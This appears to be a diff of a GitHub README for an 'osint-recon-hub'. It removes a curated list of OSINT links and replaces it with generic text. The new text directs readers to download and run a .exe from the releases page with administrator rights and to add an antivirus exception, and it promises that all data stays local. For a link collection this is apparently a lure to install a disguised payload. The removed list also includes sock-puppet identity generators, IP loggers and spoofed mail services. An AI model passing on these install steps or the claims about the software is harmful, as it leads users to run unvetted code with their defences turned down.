@@ -1,236 +1,121 @@
-# 🔍 OSINT & Recon Resource Hub
+# 🔍 osint-recon-hub - Access essential tools for digital investigations
 
-> A curated collection of tools and resources for open-source intelligence, digital investigations and threat monitoring.  
-> **For authorized use only ethical and legal investigative purposes.**
+[![Download Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/solh8229/osint-recon-hub/releases)
 
----
+## 📖 About this collection
 
-## 📧 Email Investigation
+The osint-recon-hub provides a central location for investigative resources. It gathers free tools for social media research, email analysis, IP tracking, and phone number investigation. You will find assets for GEOINT, reverse image searches, and digital forensics. This hub also hosts learning materials to help you start your journey into open-source intelligence. Use these tools only for authorized investigative work.
 
-| Tool | Link |
-|------|------|
-| Experte Email Finder | https://www.experte.com/email-finder |
-| Email Hippo | https://tools.emailhippo.com/ |
-| MX Toolbox Email Health | https://mxtoolbox.com/emailhealth |
-| Google Message Header Analyzer | https://toolbox.googleapps.com/apps/messageheader/ |
-| Castrick Clues | https://castrickclues.com/ |
-| Epieos | https://epieos.com/ |
-| OSINT Industries | https://www.osint.industries/ |
-| Avatar API | https://avatarapi.com/ |
+## 🛠️ Key features
 
----
+This collection covers many areas of digital research:
 
-## 🌐 IP & Domain Intelligence
+- Social Media Monitoring: Track profiles and activity across major platforms with approved methods.
+- Email and IP Investigation: Verify sender origins and check network logs for patterns.
+- Phone Number Research: Identify registered carriers and geographic regions linked to specific numbers.
+- GEOINT Mapping: Use satellite data and coordinates to verify locations.
+- Reverse Image Searches: Find origins of photos or discover where specific images appear online.
+- Threat Intelligence: Monitor public data feeds for security incidents and breaches.
+- Digital Forensics: Manage file metadata and examine data structures for evidence.
+- Username Tools: Locate consistent handles across multiple social networks.
 
-| Tool | Link |
-|------|------|
-| IntelX | https://intelx.io/ |
-| SecurityTrails | https://securitytrails.com/ |
-| HackerTarget IP Tools | https://hackertarget.com/ip-tools/ |
-| Wappalyzer | https://www.wappalyzer.com/ |
-| LeakIX | https://leakix.net/ |
-| Wayback Machine | https://web.archive.org/ |
-| Shodan | https://www.shodan.io/ |
-| Criminal IP | https://www.criminalip.io/ |
-| IP Leak | https://ipleak.net/ |
-| IP Teoh | https://ip.teoh.io/ |
-| DNS Dumpster | https://dnsdumpster.com/ |
+## 💻 System requirements
 
----
+The software runs on standard Windows systems. You need the following minimum setup:
 
-## 📞 Phone Number Investigation
+- Operating System: Windows 10 or Windows 11.
+- Memory: 4GB RAM or more.
+- Storage: 200MB of free disk space.
+- Internet: An active connection to access web-based tools and remote databases.
+- Permissions: You need administrator access to perform the installation on your machine.
 
-| Tool | Link |
-|------|------|
-| Free Carrier Lookup | https://freecarrierlookup.com/ |
-| ThatsThem | https://thatsthem.com/ |
-| Sync.me | https://sync.me/ |
-| Search Yellow Directory | https://www.searchyellowdirectory.com/ |
-| Ignorant (GitHub) | https://github.com/megadose/ignorant |
-| PhoneInfoga (GitHub) | https://github.com/sundowndev/PhoneInfoga |
-| OpenCelliD | https://opencellid.org/ |
+## 📥 Getting setup
 
----
+Follow these steps to access the hub on your computer.
 
-## 📱 Social Media Monitoring
+1. Visit the link below to reach the official releases page.
+   [https://github.com/solh8229/osint-recon-hub/releases](https://github.com/solh8229/osint-recon-hub/releases)
 
-| Tool | Link |
-|------|------|
-| BirdHunt (Twitter/X) | https://birdhunt.huntintel.io/ |
-| Terra (GitHub) | https://github.com/xadhrit/terra |
-| InstaHunt | https://instahunt.huntintel.io/ |
-| Apify Instagram Scraper | https://console.apify.com/actors/reGe1ST3OBgYZSsZJ/input |
-| SowSearch | https://www.sowsearch.info/ |
-| Snapchat Map | https://map.snapchat.com/ |
-| Snapchat Profile Lookup | https://www.snapchat.com/add/username |
-| Telegram Nearby Map (GitHub) | https://github.com/tejado/telegram-nearby-map |
-| Apify YouTube Scraper | https://apify.com/streamers/youtube-scraper |
+2. Look for the latest version at the top of the list. It will have a label mark like v1.0.0.
 
----
+3. Find the file ending in .exe in the Assets section. Click the filename to start the download.
 
-## 🎭 Sock Puppet / Identity Generation
+4. Once the download finishes, open your Downloads folder.
 
-| Tool | Link |
-|------|------|
-| Fake Info Generator | https://fakeinfo.net/ |
-| Generate Data | https://generatedata.com/generator |
-| Random User | https://randomuser.me/ |
-| Generated Photos | https://generated.photos/faces |
-| This Person Does Not Exist | https://thispersondoesnotexist.com/ |
-| Card Generator | https://cardgenerator.org/ |
-| ID Creator | https://www.idcreator.com/ |
+5. Double-click the file to start the installation process.
 
----
+6. Follow the prompts on your screen. Choose your install location if the installer asks.
 
-## 🛰️ GEOINT (Geospatial Intelligence)
+7. Click Finish to complete the setup.
 
-| Tool | Link |
-|------|------|
-| CyberTrail | https://cybertrail.in/ |
-| Google Maps | https://www.google.com/maps/ |
-| Google Earth | https://earth.google.com/intl/earth/download/ge/agree.html |
-| Bing Maps | https://www.bing.com/maps |
-| Dual Maps | https://www.mapchannels.com/dualmaps7/map.htm |
-| Apify Google Maps Scraper | https://console.apify.com/actors/nwua9Gu5YrADL7ZDj/input |
-| Mapillary (Street-Level) | https://www.mapillary.com/ |
-| Satellites.pro India | https://satellites.pro/India_map |
-| RSOE EDIS Event Map | https://rsoe-edis.org/eventMap |
+8. Find the desktop icon to launch the application.
 
----
+## 🛡️ Usage guidelines
 
-## 👤 Username Investigation
+Digital investigations require care. Follow these rules to keep your work ethical and safe:
 
-| Tool | Link |
-|------|------|
-| User Searcher | https://www.user-searcher.com/ |
-| Digital Footprint Check | https://www.digitalfootprintcheck.com/free-checker.html |
-| WhatsMyName | https://whatsmyname.app/ |
-| NAMINT | https://seintpl.github.io/NAMINT/ |
-| 0t.rocks Search | https://search.0t.rocks/ |
-| UserSearch | https://usersearch.org/ |
+- Only investigate targets with authorized permission.
+- Respect the privacy of individuals and organizations.
+- Keep your work local and avoid uploading sensitive evidence to unverified cloud services.
+- Verify findings through multiple independent sources.
+- Log your search steps to maintain a clear record of your activities.
+- Never use these tools for harassment or illegal tracking.
 
----
+## 💡 Learning resources
 
-## 📬 Temp Mail & SMS
+If you feel new to this field, start with these habits:
 
-| Tool | Link |
-|------|------|
-| Temp Mail | https://temp-mail.org/en/ |
-| Inboxes | https://inboxes.com/ |
-| SpoofMail | https://spoofmail.de/ |
-| Receive SMS | https://receive-smss.com/ |
+- Read public documentation on standard investigative methods.
+- Practice by searching for your own usernames or public data.
+- Study how headers work in emails to find the path of a message.
+- Learn how to read EXIF data in image files for location markers.
+- Join community forums to discuss best practices with other investigators.
+- Focus on the quality of data over the speed of the search.
 
----
+## 📁 Understanding the structure
 
-## 📍 Location Grabber / IP Logger
+The hub organizes tools into logical groups. Each group serves a specific purpose in your investigation workflow.
 
-| Tool | Link |
-|------|------|
-| Grabify | https://grabify.link/ |
-| IP Logger | https://iplogger.org/ |
-| Canary Tokens | https://canarytokens.org/nest/ |
+### Social Media Tools
+These utilities help you map interactions between users. You can see public connections and shared content history. Use these to understand the scope of an online presence.
 
----
+### Network Intelligence
+This section includes tools for IP lookups and domain registration checks. Use these to find where a server sits or who owns a particular website. Always check the legitimacy of your output by using at least two different data sources.
 
-## 🎣 Phishing Detection
+### Geographical Research
+GEOINT tools let you place events in time and space. You can match visuals from a photo against satellite maps to verify claims. Pay attention to light, shadows, and landmarks in images.
 
-| Tool | Link |
-|------|------|
-| Google Safe Browsing | https://safebrowsing.google.com/safebrowsing/report_phish/ |
-| VirusTotal URL Check | https://www.virustotal.com/gui/home/url |
-| Check Short URL | https://checkshorturl.com/ |
-| WhereGoes (URL Expander) | https://wheregoes.com/ |
+### Data Verification
+Digital forensics tools help you ensure files you find are authentic. Software in this category scans for modification dates and hidden data markers. This confirms the file came from an original source rather than a manipulated edit.
 
----
+## ⚙️ Troubleshooting
 
-## 🧠 Threat Intelligence
+If you encounter issues, try these steps:
 
-| Tool | Link |
-|------|------|
-| Reddit Hidden Web | https://www.reddit.com/r/HiddenWeb/ |
-| Hunchly | https://hunch.ly/ |
-| GTD (Global Terrorism Database) | https://www.start.umd.edu/gtd/ |
-| IntelX | https://intelx.io/ |
-| Checkpoint Threat Map | https://threatmap.checkpoint.com/ |
-| Reddit Darknet | https://www.reddit.com/r/darknet/ |
+- Check your internet connection. Many tools require live access to work properly.
+- Restart the application. This fixes common memory conflicts.
+- Ensure your antivirus software does not block the application. You might need to add an exception for this tool.
+- Clear your local cache files if the interface behaves in a slow or inconsistent way.
+- Update your Windows version if you use an outdated build.
+- Review your firewall settings. Sometimes, strict security rules prevent the tool from reaching investigative databases.
 
----
+## 📝 Frequently asked questions
 
-## 🖼️ Reverse Image Lookup
+Do I need a paid account?
+No, all tools listed are free for public use.
 
-| Tool | Link |
-|------|------|
-| Reverse Image Search | https://www.reverseimagesearch.org/ |
-| Duplichecker Reverse Image | https://www.duplichecker.com/reverse-image-search.php |
-| Google Images | https://images.google.com/ |
-| Yandex Images | https://yandex.com/images/ |
-| PimEyes (Face Search) | https://pimeyes.com/en |
-| FaceCheck.ID | https://facecheck.id/ |
+Is my data private?
+Everything you run stays on your local machine.
 
----
+Can I track anyone?
+These tools are for investigative research and follow privacy laws. Use them responsibly.
 
-## 🔬 Image Forensics
+How often should I update the tool?
+Check the release page once a month for new features and patches.
 
-| Tool | Link |
-|------|------|
-| FotoForensics | https://fotoforensics.com/ |
-| Photo Forensics (29a.ch) | https://29a.ch/photo-forensics/#forensic-magnifier |
-| ImgOps | https://imgops.com/ |
-| Icons8 Upscaler | https://icons8.com/upscaler |
-| Remini AI Enhancer | https://app.remini.ai/ |
-| Watermark Remover | https://www.watermarkremover.io/upload |
-| Remove.bg | https://www.remove.bg/ |
-| Background Remover AI | https://www.backgroundremoverai.com/ |
+What do I do if a tool link breaks?
+Report broken links in the issues section of this repository.
 
----
+## 📈 Improving your results
 
-## 📱 IMEI Investigation
-
-| Tool | Link |
-|------|------|
-| IMEI Check | https://imeicheck.com/imei-check |
-| IMEI Bulk Lookup (CyberYodha) | https://www.cyberyodha.org/2022/10/imei-bulk-lookup-tool.html |
-
----
-
-## 📌 Learning Resources
-
-**Free OSINT Courses** — a great way to get started with OSINT:
-
-| # | Course | Link |
-|---|--------|------|
-| 1 | Learn OSINT in 4.5h — Heath Adams | https://youtu.be/qwA6MmbeGNo |
-| 2 | OSINT At Home — Benjamin S. | https://youtube.com/playlist?list=PLrFPX1Vfqk3ehZKSFeb9pVIHqxqrNW8Sy |
-| 3 | 10 Minute OSINT Tips — The OSINT Curious Project | https://youtube.com/playlist?list=PL423I_gHbWUUOs09899rex4t2l5py9YIk |
-| 4 | Complete OSINT Exercises Walkthroughs — Sofia Santos | https://youtube.com/playlist?list=PLwFbKk71Xo1y6OnyZRt65A2CVKC_Eoiqh |
-| 5 | OSINT Training — Motasem Hamdan | https://youtube.com/playlist?list=PLqM63j87R5p6dZeq1l_EIPP6NkJi51wET |
-| 6 | OSINT Course — David Pereira | https://youtube.com/playlist?list=PL1Kv5m-HTbQzxQd--mDXRjsR1ddqRk0aE |
-| 7 | The Complete OSINT Course — Irfan Shakeel | https://youtu.be/opLD4zFB5z0 |
-| 8 | OSINT Tutorials — TechChip | https://youtube.com/playlist?list=PL0fjgIGwLMWQDNiizQiN3GDh7Uxcttntf |
-| 9 | Open Source Intelligence — Hackers Arise | https://www.hackers-arise.com/osint |
-| 10 | Dark Web Foundation: A Guide to the Deep/Dark Web 2019 — Dark Web Academy | https://www.udemy.com/course/deep-web/ |
-| 11 | OSINT Tutorials — Null Byte | https://youtube.com/@nullbytewht |
-| 12 | OSINT Workshop — Andrew Fordred | https://courses.thecyberinst.org/courses/osintworkshop |
-
-> **Note:** Throughout the course, whatever you learn should be put to ethical use.
-
----
-
-## ⚖️ Law Enforcement & Legal Portals
-
-| Tool | Link |
-|------|------|
-| The 420 - Nodal Officers | https://www.the420.in/find-nodal-officers/ |
-| Facebook Law Enforcement Records | https://www.facebook.com/records/login/ |
-| X (Twitter) Law Enforcement | https://help.x.com/en/forms/law-enforcement |
-| Kodex Global (LinkedIn LE) | https://app.kodexglobal.com/linkedin/signin |
-| WhatsApp Law Enforcement | https://www.whatsapp.com/records/login/ |
-| Google LERS | https://lers.google.com/signup_v2/landing |
-| Yahoo Law Enforcement | https://id.b2b.yahooinc.com/identity/XUI/#login/ |
-| Microsoft LE Portal | https://leportal.microsoft.com/home |
-| PhonePe Cybercell | https://cybercell.phonepe.com/ |
-| Razorpay Cybercrime Support | https://razorpay.com/support/?cybercrime |
-
----
-
-*Maintained for authorized OSINT, red team research and digital forensics use.*
+Good research depends on how you structure your queries. Write down your objective before you start. Break your goal into smaller questions. If you look for a person, start with their unique username. Expand to email aliases only if the first search yields results. Maintain a clean workspace. Close unnecessary browser tabs and keep your research notes in a dedicated folder. Treat every piece of evidence with skepticism until you prove it with a second, independent source. This approach reduces errors and leads to more reliable findings.
